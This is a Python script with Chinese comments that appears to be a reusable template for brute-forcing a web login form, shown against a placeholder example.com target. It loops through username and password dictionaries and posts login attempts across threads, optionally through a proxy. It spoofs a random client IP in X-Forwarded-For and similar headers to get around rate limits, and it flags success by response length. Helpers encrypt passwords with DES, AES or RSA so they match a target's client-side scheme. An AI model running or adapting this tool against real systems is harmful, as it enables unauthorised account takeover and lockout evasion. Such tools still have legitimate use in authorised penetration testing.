# coding=utf-8

from requests.exceptions import ConnectTimeout, ConnectionError, ReadTimeout
import requests, urllib3, random, os, traceback, time, binascii, base64
from datetime import datetime, timedelta
from Crypto.PublicKey import RSA
from Crypto.Cipher import DES, AES, PKCS1_v1_5
from Crypto.Util.Padding import pad
from concurrent import futures

# 禁用https警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#
# =================== [ 全局设置 ] ===================
#

# 字典
USERNAME = ["admin"]   # USERNAME = USERNAME + USERNAME_FILE_PATH
PASSWORD = ["123456"]  # PASSWORD = PASSWORD + PASSWORD_FILE_PATH

# 字典文件路径，代码被注释、空字符串或None就不读取
#USERNAME_FILE_PATH = "/root/bruteforce/username.txt"
#PASSWORD_FILE_PATH = "/root/bruteforce/password.txt"
#USERNAME_FILE_PATH = "D:\\Bruteforce\\username.txt"
#PASSWORD_FILE_PATH = "D:\\Bruteforce\\password.txt"

# 只爆破一个账号
ONLY_ONCE = False

# 爆破后暂停时长，单位秒
DELAY = 1

# 线程并发数
THREADS = 1

# 是否使用代理
USE_PROXY = True

# 设置代理
PROXIES = {
    "http": "http://127.0.0.1:8083",
    "https": "http://127.0.0.1:8083"
}

# 加载用户名字典
if 'USERNAME_FILE_PATH' in vars() and USERNAME_FILE_PATH:
    try:
        with open(USERNAME_FILE_PATH, "r") as f:
            USERNAME.extend(f.readlines())
    except Exception as e:
        print(f"[x] Cannot open '{USERNAME_FILE_PATH}' file {e}")
        os._exit(0)

# 加载密码字典
if 'PASSWORD_FILE_PATH' in vars() and PASSWORD_FILE_PATH:
    try:
        with open(PASSWORD_FILE_PATH, "r") as f:
            PASSWORD.extend(f.readlines())
    except Exception as e:
        print(f"[x] Cannot open '{PASSWORD_FILE_PATH}' file {e}")
        os._exit(0)

# 设置Headers
HEADERS = requests.utils.default_headers()
HEADERS.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
})

#
# =================== [ 工具函数 ] ===================
#

# 随机IP生成
def random_ipv4():
    return ".".join(str(random.randint(0,255)) for _ in range(4))

# DES加密
def DES_encrypt(message: str) -> str:
    cipher = DES.new(key=b'12345678', iv=b'12345678', mode=DES.MODE_CBC)
    message = pad(message.encode('utf-8'), DES.block_size, style='pkcs7')
    encrypted = cipher.encrypt(message)
    encrypted = base64.b64encode(encrypted) # BASE64
    #encrypted = binascii.hexlify(encrypted) # HEX
    return encrypted.decode('utf-8') #.upper()

# AES加密
def AES_encrypt(message: str) -> str:
    cipher = AES.new(key=b'1234567890ABCDEF', iv=b'1234567890ABCDEF', mode=DES.MODE_CBC)
    message = pad(message.encode('utf-8'), AES.block_size, style='pkcs7')
    encrypted = cipher.encrypt(message)
    encrypted = base64.b64encode(encrypted) # BASE64
    #encrypted = binascii.hexlify(encrypted) # HEX
    return encrypted.decode('utf-8') #.upper()

# RSA加密
def RSA_encrypt(message: str) -> str:
    pubkey = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyyD6Zn7VNrR/YknPProx
P9oEzkxeG+VCFLwQ+k2cAWuYWQKSnXSW/UX3sHLIyLXsorKQe19pQOIjssr46KN+
PQbDVG7zaj6RZZlTC+q6/kXwRw0v9wXQ2dXBjNdCDNNwop/GxavvKhLJonKRgVFm
2Y4cUxxcL/ZukvJ5aJAaHoRaf7/jq4vTDWARyroFh6pEN7TGg3acwH9YSpkOX5sV
n7pT9qwFOZ+DdvIUOIvO3hIRA1PDQOSVJRawsffwqFCzxeZMmeakEr7Tn4NavkVL
oXdRoE29N6JHoBBinjNd/yLCE352E2M/WJeYNhlugzVyFNcuyckqsIl5Hrm3qHvT
YwIDAQAB
-----END PUBLIC KEY-----"""
    pubkey = RSA.importKey(pubkey)
    cipher = PKCS1_v1_5.new(pubkey)
    message = message.encode('utf-8')
    encrypted = cipher.encrypt(message)
    encrypted = base64.b64encode(encrypted) # BASE64
    #encrypted = binascii.hexlify(encrypted) # HEX
    return encrypted.decode('utf-8') #.upper()

#
# =================== [ 爆破函数 ] ===================
#

# 爆破函数，返回 (has_exception, found_password)
def run(username, password):

    IP = random_ipv4()
    HEADERS.update({
        "X-Forwarded-For": IP,
        "X-Originating-IP": IP,
        "X-Remote-IP": IP,
        "X-Remote-Addr": IP,
        "X-Real-IP": IP
    })
    
    session = requests.Session()

    time.sleep(DELAY)

    try:
        # 可以先用 session 请求一次 CSRF Token / Cookie 再发起登录请求
        #response = session.get("https://example.com/login.html", headers=HEADERS, timeout=10, 
        #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)

        data = {
            "username": username,
            "password": password
        }
        response = session.post("https://example.com/login.html", data=data, headers=HEADERS, timeout=10, 
            allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)

        # if len(response.content) != 61:
        # if response.status_code != 401:
        # if "Failed" not in response.text:
        # if response.status_code == 302 and "index/user.html" in response.headers['Location']:

        if len(response.content) != 61:
            print(f"[+] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}")
            return False, True

        return False, False

    except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}")
        return True, False

    except Exception as e:
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}, detail:")
        print(traceback.format_exc())
        return True, False

#
# =================== [ 启动多线程爆破 ] ===================
#

TASKS = set()
TOTAL_COUNT = len(USERNAME) * len(PASSWORD)
FINISHED_COUNT = 0
EXCEPTION_COUNT = 0 # 连续异常计数
FOUND_PASSWORD = False # 找到密码信号

STOP_FLAG = False # 线程停止信号

TIME_FOR_NOW = datetime.now()

# deltatime 格式化
def strfdelta(delta, fmt):
    d = dict()
    d["days"] = delta.days
    d["hours"], rem = divmod(delta.seconds, 3600)
    d["minutes"], d["seconds"] = divmod(rem, 60)
    return fmt.format(**d)

# 任务完成时的回调
def callback(future):
    global STOP_FLAG, FINISHED_COUNT, EXCEPTION_COUNT
    
    # 获取结果
    has_exception, found_password = future.result()
    
    # 完成计数+1
    FINISHED_COUNT += 1
    
    # 检查异常
    if has_exception:
        EXCEPTION_COUNT += 1
        if EXCEPTION_COUNT >= 5:
            print(f"[x] {datetime.now().strftime('%H:%M:%S')} Too much error. Quiting.")
            STOP_FLAG = True
    else:
        EXCEPTION_COUNT = 0

    # 标记是否找到密码
    if found_password == True:
        FOUND_PASSWORD = True
        if FOUND_PASSWORD and ONLY_ONCE:
            print(f"[+] {datetime.now().strftime('%H:%M:%S')} Password found. Quiting.")
            STOP_FLAG = True

# 并发运行爆破函数
def concurrent_run(executor):
    global STOP_FLAG, TIME_FOR_NOW, TASKS, FINISHED_COUNT
    
    for username in USERNAME:
        for password in PASSWORD:
            # 检查是否需要退出
            if STOP_FLAG == True:
                return

            # 每X分钟显示一次进度
            if datetime.now() - TIME_FOR_NOW >= timedelta(minutes=1):
                TIME_FOR_NOW = datetime.now()
                print(f"[!] {datetime.now().strftime('%H:%M:%S')} {FINISHED_COUNT}/{TOTAL_COUNT} ({FINISHED_COUNT * 100 // TOTAL_COUNT}%) finished")

            # 如果队列过长就等待
            if len(TASKS) >= THREADS * 5:
                _, TASKS = futures.wait(TASKS, return_when=futures.FIRST_COMPLETED)

            # 清除右边的换行
            username = username.rstrip()
            password = password.rstrip()
            
            # 新建线程
            t = executor.submit(run, username, password)
            t.add_done_callback(callback)
            TASKS.add(t)

# 线程池
with futures.ThreadPoolExecutor(max_workers=THREADS) as executor:

    now = datetime.now()
    start_at = now
    print(f"[+] {now.strftime('%H:%M:%S')} task start")
    print(f"[!] {now.strftime('%H:%M:%S')} {FINISHED_COUNT}/{TOTAL_COUNT} ({FINISHED_COUNT * 100 // TOTAL_COUNT}%) finished")

    try:
        concurrent_run(executor)
        print("[!] Wait for all threads exit.")
        futures.wait(TASKS, return_when=futures.ALL_COMPLETED)
    except KeyboardInterrupt:
        print("[!] Get Ctrl-C, wait for all threads exit.")
        futures.wait(TASKS, return_when=futures.ALL_COMPLETED)

    now = datetime.now()
    end_at = now
    elapsed = strfdelta(end_at - start_at, "{days} days {hours}:{minutes}:{seconds}")
    print(f"[+] {now.strftime('%H:%M:%S')} task finished, elapsed {elapsed}")
